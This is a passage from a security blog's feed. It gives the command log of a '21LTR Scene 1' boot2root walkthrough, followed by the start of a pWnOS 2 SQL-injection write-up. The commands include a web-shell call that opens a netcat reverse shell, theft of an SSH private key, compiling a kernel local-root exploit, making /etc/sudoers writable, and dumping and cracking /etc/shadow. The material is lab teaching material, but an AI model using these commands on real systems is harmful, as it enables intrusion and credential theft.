&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;span class="line-number"&gt;59&lt;/span&gt;
&lt;span class="line-number"&gt;60&lt;/span&gt;
&lt;span class="line-number"&gt;61&lt;/span&gt;
&lt;span class="line-number"&gt;62&lt;/span&gt;
&lt;span class="line-number"&gt;63&lt;/span&gt;
&lt;span class="line-number"&gt;64&lt;/span&gt;
&lt;span class="line-number"&gt;65&lt;/span&gt;
&lt;span class="line-number"&gt;66&lt;/span&gt;
&lt;span class="line-number"&gt;67&lt;/span&gt;
&lt;span class="line-number"&gt;68&lt;/span&gt;
&lt;span class="line-number"&gt;69&lt;/span&gt;
&lt;span class="line-number"&gt;70&lt;/span&gt;
&lt;span class="line-number"&gt;71&lt;/span&gt;
&lt;span class="line-number"&gt;72&lt;/span&gt;
&lt;span class="line-number"&gt;73&lt;/span&gt;
&lt;span class="line-number"&gt;74&lt;/span&gt;
&lt;span class="line-number"&gt;75&lt;/span&gt;
&lt;span class="line-number"&gt;76&lt;/span&gt;
&lt;span class="line-number"&gt;77&lt;/span&gt;
&lt;span class="line-number"&gt;78&lt;/span&gt;
&lt;span class="line-number"&gt;79&lt;/span&gt;
&lt;span class="line-number"&gt;80&lt;/span&gt;
&lt;span class="line-number"&gt;81&lt;/span&gt;
&lt;span class="line-number"&gt;82&lt;/span&gt;
&lt;span class="line-number"&gt;83&lt;/span&gt;
&lt;span class="line-number"&gt;84&lt;/span&gt;
&lt;span class="line-number"&gt;85&lt;/span&gt;
&lt;span class="line-number"&gt;86&lt;/span&gt;
&lt;span class="line-number"&gt;87&lt;/span&gt;
&lt;span class="line-number"&gt;88&lt;/span&gt;
&lt;span class="line-number"&gt;89&lt;/span&gt;
&lt;span class="line-number"&gt;90&lt;/span&gt;
&lt;span class="line-number"&gt;91&lt;/span&gt;
&lt;span class="line-number"&gt;92&lt;/span&gt;
&lt;span class="line-number"&gt;93&lt;/span&gt;
&lt;span class="line-number"&gt;94&lt;/span&gt;
&lt;span class="line-number"&gt;95&lt;/span&gt;
&lt;span class="line-number"&gt;96&lt;/span&gt;
&lt;span class="line-number"&gt;97&lt;/span&gt;
&lt;span class="line-number"&gt;98&lt;/span&gt;
&lt;span class="line-number"&gt;99&lt;/span&gt;
&lt;span class="line-number"&gt;100&lt;/span&gt;
&lt;span class="line-number"&gt;101&lt;/span&gt;
&lt;span class="line-number"&gt;102&lt;/span&gt;
&lt;span class="line-number"&gt;103&lt;/span&gt;
&lt;span class="line-number"&gt;104&lt;/span&gt;
&lt;span class="line-number"&gt;105&lt;/span&gt;
&lt;span class="line-number"&gt;106&lt;/span&gt;
&lt;span class="line-number"&gt;107&lt;/span&gt;
&lt;span class="line-number"&gt;108&lt;/span&gt;
&lt;span class="line-number"&gt;109&lt;/span&gt;
&lt;span class="line-number"&gt;110&lt;/span&gt;
&lt;span class="line-number"&gt;111&lt;/span&gt;
&lt;span class="line-number"&gt;112&lt;/span&gt;
&lt;span class="line-number"&gt;113&lt;/span&gt;
&lt;span class="line-number"&gt;114&lt;/span&gt;
&lt;span class="line-number"&gt;115&lt;/span&gt;
&lt;span class="line-number"&gt;116&lt;/span&gt;
&lt;span class="line-number"&gt;117&lt;/span&gt;
&lt;span class="line-number"&gt;118&lt;/span&gt;
&lt;span class="line-number"&gt;119&lt;/span&gt;
&lt;span class="line-number"&gt;120&lt;/span&gt;
&lt;span class="line-number"&gt;121&lt;/span&gt;
&lt;span class="line-number"&gt;122&lt;/span&gt;
&lt;span class="line-number"&gt;123&lt;/span&gt;
&lt;span class="line-number"&gt;124&lt;/span&gt;
&lt;span class="line-number"&gt;125&lt;/span&gt;
&lt;span class="line-number"&gt;126&lt;/span&gt;
&lt;span class="line-number"&gt;127&lt;/span&gt;
&lt;span class="line-number"&gt;128&lt;/span&gt;
&lt;span class="line-number"&gt;129&lt;/span&gt;
&lt;span class="line-number"&gt;130&lt;/span&gt;
&lt;span class="line-number"&gt;131&lt;/span&gt;
&lt;span class="line-number"&gt;132&lt;/span&gt;
&lt;span class="line-number"&gt;133&lt;/span&gt;
&lt;span class="line-number"&gt;134&lt;/span&gt;
&lt;span class="line-number"&gt;135&lt;/span&gt;
&lt;span class="line-number"&gt;136&lt;/span&gt;
&lt;span class="line-number"&gt;137&lt;/span&gt;
&lt;span class="line-number"&gt;138&lt;/span&gt;
&lt;span class="line-number"&gt;139&lt;/span&gt;
&lt;span class="line-number"&gt;140&lt;/span&gt;
&lt;span class="line-number"&gt;141&lt;/span&gt;
&lt;span class="line-number"&gt;142&lt;/span&gt;
&lt;span class="line-number"&gt;143&lt;/span&gt;
&lt;span class="line-number"&gt;144&lt;/span&gt;
&lt;span class="line-number"&gt;145&lt;/span&gt;
&lt;span class="line-number"&gt;146&lt;/span&gt;
&lt;span class="line-number"&gt;147&lt;/span&gt;
&lt;span class="line-number"&gt;148&lt;/span&gt;
&lt;span class="line-number"&gt;149&lt;/span&gt;
&lt;span class="line-number"&gt;150&lt;/span&gt;
&lt;span class="line-number"&gt;151&lt;/span&gt;
&lt;span class="line-number"&gt;152&lt;/span&gt;
&lt;span class="line-number"&gt;153&lt;/span&gt;
&lt;span class="line-number"&gt;154&lt;/span&gt;
&lt;span class="line-number"&gt;155&lt;/span&gt;
&lt;span class="line-number"&gt;156&lt;/span&gt;
&lt;span class="line-number"&gt;157&lt;/span&gt;
&lt;span class="line-number"&gt;158&lt;/span&gt;
&lt;span class="line-number"&gt;159&lt;/span&gt;
&lt;span class="line-number"&gt;160&lt;/span&gt;
&lt;span class="line-number"&gt;161&lt;/span&gt;
&lt;span class="line-number"&gt;162&lt;/span&gt;
&lt;span class="line-number"&gt;163&lt;/span&gt;
&lt;span class="line-number"&gt;164&lt;/span&gt;
&lt;span class="line-number"&gt;165&lt;/span&gt;
&lt;span class="line-number"&gt;166&lt;/span&gt;
&lt;span class="line-number"&gt;167&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;netdiscover
&lt;/span&gt;&lt;span class="line"&gt;ifconfig eth0
&lt;/span&gt;&lt;span class="line"&gt;!! 192.168.2.21/24
&lt;/span&gt;&lt;span class="line"&gt;us -mT -Iv 192.168.2.120:a -r &lt;span class="m"&gt;3000&lt;/span&gt; -R &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; us -mU -Iv 192.168.2.120:a -r &lt;span class="m"&gt;3000&lt;/span&gt; -R 3
&lt;/span&gt;&lt;span class="line"&gt;nmap -p 1-65535 -T4 -A -v 192.168.2.120
&lt;/span&gt;&lt;span class="line"&gt;firefox 192.168.2.120   &lt;span class="c"&gt;# Right click -&amp;gt; View source&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/web/dirb/
&lt;/span&gt;&lt;span class="line"&gt;ll
&lt;/span&gt;&lt;span class="line"&gt;./dirb
&lt;/span&gt;&lt;span class="line"&gt;!! http://192.168.2.120
&lt;/span&gt;&lt;span class="line"&gt;curl --silent http://192.168.2.120/logs/
&lt;/span&gt;&lt;span class="line"&gt;curl --silent http://192.168.2.120 &lt;span class="p"&gt;|&lt;/span&gt; grep username   &lt;span class="c"&gt;# grep username -A1 -B1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~
&lt;/span&gt;&lt;span class="line"&gt;ftp 192.168.2.120 &lt;span class="c"&gt;# logs:zg]E-b0] 8:(58G&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ls
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;get backup_log.php
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#put /etc/passwd /&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;quit
&lt;/span&gt;&lt;span class="line"&gt;ls
&lt;/span&gt;&lt;span class="line"&gt;cat backup_log.php
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;history&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep curl
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 192.168.2.120/logs/backup_log.php
&lt;/span&gt;&lt;span class="line"&gt;!! &lt;span class="p"&gt;|&lt;/span&gt; grep from   &lt;span class="c"&gt;# ip address and &amp;quot;every&amp;quot; 10 mins isn!&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;fc&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;!if&amp;quot;&lt;/span&gt;   &lt;span class="c"&gt;# ifconfig eth0 192.168.2.240/24&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;!us:p
&lt;/span&gt;&lt;span class="line"&gt;watch -d -n &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;us -mT -Iv 192.168.2.120:a -r 3000&amp;quot;&lt;/span&gt;   &lt;span class="c"&gt;# Port 1001 will/should open up in less than 10 mins&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#iptables -A INPUT -p tcp --syn -j LOG --log-prefix &amp;quot;iptables: &amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#iptables -A INPUT -p udp -j LOG --log-prefix &amp;quot;iptables: &amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#iptables -L&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#tail -f /var/log/messages&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#nc localhost 1234&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#*wait* till iptables trigger &amp;amp; port scan shows new port (10 mins)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#nc -lvp 10000 &amp;gt; output&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#file output&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#tar xvf output&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#file media/backup/pxelinux.cfg.tar.gz&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#tar xvf media/backup/pxelinux.cfg.tar.gz&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd pxelinux.cfg/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#ll&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#file *&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat default&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat start&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd web/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#ll&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#file *&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat start&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd conf/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#ll&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#file *&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat monkey.conf&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat monkey.deny&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cat monkey.mime&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#cd ~&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; nc -v 192.168.2.120 &lt;span class="m"&gt;10001&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; sleep 1&lt;span class="p"&gt;;&lt;/span&gt; clear&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#at now   1 minutes&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#nc -v 192.168.2.120 10001&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Break (Ctrl + D)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#atq   #at -l&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;?
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 192.168.2.120/logs/backup_log.php
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;!!
&lt;/span&gt;&lt;span class="line"&gt;!!?cmd&lt;span class="o"&gt;=&lt;/span&gt;id &lt;span class="c"&gt;#curl --silent 192.168.2.120/logs/backup_log.php?cmd=id&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 192.168.2.120/logs/backup_log.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;id &lt;span class="p"&gt;|&lt;/span&gt; grep ? -A999
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 192.168.2.120/logs/backup_log.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;whereis nc &lt;span class="p"&gt;|&lt;/span&gt; grep ? -A999
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;nc -lvvp 443
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 192.168.2.120/logs/backup_log.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/nc 192.168.2.240 &lt;span class="m"&gt;443&lt;/span&gt; -e /bin/sh
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#sh -i&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;id
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#pwd&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#alias ll=&amp;quot;ls -lah&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#ll&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/backdoors/web/webhandler/
&lt;/span&gt;&lt;span class="line"&gt;./webhandler.py
&lt;/span&gt;&lt;span class="line"&gt;./webhandler.py --listen 443
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl --silent 192.168.2.120/logs/backup_log.php?cmd&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/nc 192.168.2.240 &lt;span class="m"&gt;443&lt;/span&gt; -e /bin/sh
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;id
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ll
&lt;/span&gt;&lt;span class="line"&gt;uname -a
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/passwd
&lt;/span&gt;&lt;span class="line"&gt;ll /
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /media
&lt;/span&gt;&lt;span class="line"&gt;ll -R
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;USB_1/Stuff/Keys
&lt;/span&gt;&lt;span class="line"&gt;cat authorized_keys
&lt;/span&gt;&lt;span class="line"&gt;cat id_rsa
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#echo '' &amp;gt; sshkey&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;@download /media/USB_1/Stuff/Keys/id_rsa /root/sshkey
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~
&lt;/span&gt;&lt;span class="line"&gt;file sshkey
&lt;/span&gt;&lt;span class="line"&gt;chmod &lt;span class="m"&gt;600&lt;/span&gt; sshkey
&lt;/span&gt;&lt;span class="line"&gt;ssh hbeale@192.168.2.120 -i sshkey
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/passwd
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/group
&lt;/span&gt;&lt;span class="line"&gt;id
&lt;/span&gt;&lt;span class="line"&gt;cat /etc/sudoers
&lt;/span&gt;&lt;span class="line"&gt;uname -a
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /pentest/exploits/exploitdb
&lt;/span&gt;&lt;span class="line"&gt;grep -i &lt;span class="s2"&gt;&amp;quot;kernel 2.6&amp;quot;&lt;/span&gt; files.csv
&lt;/span&gt;&lt;span class="line"&gt;head platforms/linux/local/8572.c
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;whereis gcc
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;gcc platforms/linux/local/8572.c -o /tmp/evil
&lt;/span&gt;&lt;span class="line"&gt;vi platforms/linux/local/8572.c
&lt;/span&gt;&lt;span class="line"&gt;scp -C /tmp/out hbeale@192.168.2.120 -i /root/sshkey
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
&lt;/span&gt;&lt;span class="line"&gt;vi run   &lt;span class="c"&gt;# echo -e &amp;quot;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;chmod &lt;span class="m"&gt;777&lt;/span&gt; /etc/sudoers&lt;span class="s2"&gt;&amp;quot; (start doing shadow)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;cat /proc/net/netlink&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;ls -l /etc/sudoers&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;./evil&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;!ls&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;cat /etc/sudoers&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;sudo su&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;su -&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;sudo cat /etc/shadow&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;ls -l /etc/sudoers&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;!vi #update to shadow&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;!./&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;!ssh cat /etc/shadow &amp;gt; 21ltr&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;#cd ~&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;#echo '' &amp;gt; 21ltr&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;cd /pentest/passwords/john&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;./john ~/21ltr --wordlist=/pentest/passwords/wordlists/darkc0de.lst #--rules&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;./john ~/21ltr --show&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s2"&gt;fc &amp;quot;&lt;/span&gt;!ssh&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;   &lt;span class="c"&gt;# add '/root' &amp;amp; #&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;su - &lt;span class="c"&gt;# formula1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#whoami&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;id&lt;span class="p"&gt;;&lt;/span&gt; uname -a&lt;span class="p"&gt;;&lt;/span&gt; cat /etc/shadow&lt;span class="p"&gt;;&lt;/span&gt; ls -lah /root   &lt;span class="c"&gt;# ls -lahR /root; ifconfig -a;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;ls -lAhR /home
&lt;/span&gt;&lt;span class="line"&gt;cat /home/jgreen/.local/share/Trash/files/Payroll
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;vi run
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;chmod
&lt;/span&gt;&lt;span class="line"&gt;ls
&lt;/span&gt;&lt;span class="line"&gt;./run
&lt;/span&gt;&lt;span class="line"&gt;cat
&lt;/span&gt;&lt;span class="line"&gt;ls -lh
&lt;/span&gt;&lt;span class="line"&gt;./evil id
&lt;/span&gt;&lt;span class="line"&gt;!ls
&lt;/span&gt;&lt;span class="line"&gt;cat shudders
&lt;/span&gt;&lt;span class="line"&gt;id
&lt;/span&gt;&lt;span class="line"&gt;cat /shadow
&lt;/span&gt;&lt;span class="line"&gt;sudo !!
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;a name="Notes"&gt;&lt;/a&gt;
&lt;h2&gt;Notes&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Instead of doing "cat /etc/passwd" when using WebHandler, "@enum users" could of been used.&lt;/li&gt;
&lt;li&gt;Camtasia Studio has rendered a couple of highlighted boxes unevenly. Nothing I can do about this.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Songs: &lt;a href="http://www.beatport.com/track/afterthought-original-mix/3307760"&gt;Afterthought (Original Mix) - Parker &amp;amp; Hanson&lt;/a&gt; &amp;amp; &lt;a href="http://www.beatport.com/track/ru116-original-mix/2025671"&gt;RU116 (Original Mix) - Cramp&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Video length: 14:45&lt;/p&gt;

&lt;p&gt;Capture length: 76:15&lt;/p&gt;

&lt;p&gt;Blog Post: &lt;a href="https://blog.g0tmi1k.com/2012/09/21ltr-scene-1/"&gt;https://blog.g0tmi1k.com/2012/09/21ltr-scene-1/&lt;/a&gt;&lt;/p&gt;</description><pubDate>Fri, 14 Sep 2012 10:30:00 +0000</pubDate></item><item><title>pWnOS 2 (SQL Injection)</title><link>https://blog.g0tmi1k.com/2012/09/pwnos-2-sql-injection/</link><description>&lt;p&gt;This is the second release in the "&lt;a href="https://blog.g0tmi1k.com/categories/pwnos/"&gt;pWnOS&lt;/a&gt;" &lt;a href="https://blog.g0tmi1k.com/2011/03/vulnerable-by-design/"&gt;vulnerable machine&lt;/a&gt; collection, however, it has a different creator from the previous one (which explains why it has a different "feel" to it). As before, it has purposely built in "issues" allowing the machine to become compromised. This method uses a SQL injection flaw (see &lt;a href="https://blog.g0tmi1k.com/2012/09/pwnos-2-php-web-application/"&gt;here&lt;/a&gt; for exploiting the PHP web application). As always with "&lt;a href="https://blog.g0tmi1k.com/categories/boot2root/"&gt;boot2root&lt;/a&gt;" machines, the end goal is to become the super user, "root".&lt;/p&gt;

&lt;p&gt;&lt;img alt="pwnOS Logo" class="center" height="105" src="https://blog.g0tmi1k.com/images/pwnos2.png" title="pwnOS2" width="469" /&gt;&lt;/p&gt;

&lt;!--more--&gt;




&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Links"&gt;Links&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Method"&gt;Method&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Tools"&gt;Tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Walkthrough"&gt;Walkthrough&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Commands"&gt;Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Notes"&gt;Notes&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Links"&gt;&lt;/a&gt;
&lt;h2&gt;Links&lt;/h2&gt;

&lt;p&gt;Watch video on-line: &lt;video controls="controls" height="432" poster="https://blog.g0tmi1k.com/atom.xml" preload="none" width="576"&gt;&lt;source src="http://download.g0tmi1k.com/videos_archive/pWnOS_2_%28SQL%29.mp4" /&gt;&lt;/video&gt;&lt;/p&gt;

&lt;p&gt;Download video: &lt;a href="http://download.g0tmi1k.com/videos_archive/pWnOS_2_%28SQL%29.mp4"&gt;http://download.g0tmi1k.com/videos_archive/pWnOS_2_(SQL).mp4&lt;/a&gt;&lt;/p&gt;

&lt;a name="Method"&gt;&lt;/a&gt;
&lt;h2&gt;Method&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Scanned the network to discover the target [Net Discover]&lt;/li&gt;
&lt;li&gt;Port scanned the target to determine the running services on the target [Unicorn Scan]&lt;/li&gt;
&lt;li&gt;Emulated the services by grabbing the banner/header of the running service(s) [NMap]&lt;/li&gt;
&lt;li&gt;Interacted with the web server, found a login form and entered a "default" injection statement(s), to identify a vulnerability [Firefox]&lt;/li&gt;
&lt;li&gt;Emulated the database which exposed information regarding the database itself, as well as the operating system [Burp proxy]&lt;/li&gt;
&lt;li&gt;Uploaded a PHP shell onto the target to gain remote command access into the system [Pentest Monkey PHP Shell &amp;amp; Burp proxy]&lt;/li&gt;
&lt;li&gt;Automated the same attack [SQLMap]&lt;/li&gt;
